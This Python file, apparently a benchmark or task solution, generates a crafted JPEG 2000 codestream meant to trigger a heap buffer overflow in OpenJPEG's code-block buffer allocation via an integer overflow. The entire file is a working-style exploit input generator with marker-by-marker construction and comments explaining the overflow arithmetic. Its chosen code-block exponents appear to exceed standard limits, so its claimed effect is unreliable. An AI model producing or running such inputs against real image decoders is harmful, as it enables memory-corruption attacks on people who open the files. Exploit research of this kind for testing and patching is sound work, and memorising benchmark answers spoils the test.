import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a J2K codestream that triggers a heap buffer overflow in opj_t1_allocate_buffers
        # caused by an integer overflow in the allocation size calculation.
        # Targeted for OpenJPEG HT_DEC component.
        
        # Markers
        SOC = b"\xFF\x4F"
        SIZ = b"\xFF\x51"
        COD = b"\xFF\x52"
        QCD = b"\xFF\x5C"
        CAP = b"\xFF\x50"
        SOT = b"\xFF\x90"
        SOD = b"\xFF\x93"
        EOC = b"\xFF\xD9"

        # Parameters
        # Large dimensions to allow large codeblocks
        width = 40000
        height = 40000
        
        # Codeblock size exponents: 13 -> 2^(13+2) = 32768
        # Allocation size ~ (32768 + 6) * 32768 * 4 (bytes)
        # This results in ~4.29 GB, which overflows 32-bit unsigned integer to a small value (~768 KB).
        # Subsequent writes will overflow the small allocated buffer.
        xcb = 13
        ycb = 13
        
        # 1. SIZ Marker
        # Rsiz=0, Xsiz=width, Ysiz=height, XOsiz=0, YOsiz=0, XTsiz=width, YTsiz=height, ...
        siz_body = struct.pack(">H", 0) 
        siz_body += struct.pack(">I", width)
        siz_body += struct.pack(">I", height)
        siz_body += struct.pack(">I", 0)
        siz_body += struct.pack(">I", 0)
        siz_body += struct.pack(">I", width)
        siz_body += struct.pack(">I", height)
        siz_body += struct.pack(">I", 0)
        siz_body += struct.pack(">I", 0)
        siz_body += struct.pack(">H", 1) # 1 Component
        siz_body += struct.pack(">B", 7) # 8-bit depth (7+1)
        siz_body += struct.pack(">B", 1) # XRsiz
        siz_body += struct.pack(">B", 1) # YRsiz
        
        marker_siz = SIZ + struct.pack(">H", len(siz_body) + 2) + siz_body
        
        # 2. CAP Marker (Enable HTJ2K)
        # Pcap bit 14 set (0x4000) for Part 15 (HT)
        cap_body = struct.pack(">I", 0x4000)
        cap_body += struct.pack(">H", 0) # Ccap15
        
        marker_cap = CAP + struct.pack(">H", len(cap_body) + 2) + cap_body
        
        # 3. COD Marker
        # Define large codeblock size via xcb/ycb
        cod_body = struct.pack(">B", 0) # Scod
        cod_body += struct.pack(">B", 0) # SGcod: Progress Order
        cod_body += struct.pack(">H", 1) # SGcod: Layers
        cod_body += struct.pack(">B", 0) # SGcod: MCT
        
        cod_body += struct.pack(">B", 0) # SPcod: Levels (0)
        cod_body += struct.pack(">B", xcb) 
        cod_body += struct.pack(">B", ycb)
        cod_body += struct.pack(">B", 0) # SPcod: Mode
        cod_body += struct.pack(">B", 1) # SPcod: Trans
        
        marker_cod = COD + struct.pack(">H", len(cod_body) + 2) + cod_body
        
        # 4. QCD Marker
        # No quantization
        qcd_body = struct.pack(">B", 0x20)
        qcd_body += struct.pack(">B", 0)
        
        marker_qcd = QCD + struct.pack(">H", len(qcd_body) + 2) + qcd_body
        
        # 5. SOT Marker
        sot_body = struct.pack(">H", 0)
        sot_body += struct.pack(">I", 0)
        sot_body += struct.pack(">B", 0)
        sot_body += struct.pack(">B", 1)
        
        marker_sot = SOT + struct.pack(">H", len(sot_body) + 2) + sot_body
        
        # 6. Payload
        # Dummy data
        payload = b"\x00" * 256
        
        # Construct final bytes
        data = SOC + marker_siz + marker_cap + marker_cod + marker_qcd + marker_sot + SOD + payload + EOC
        return data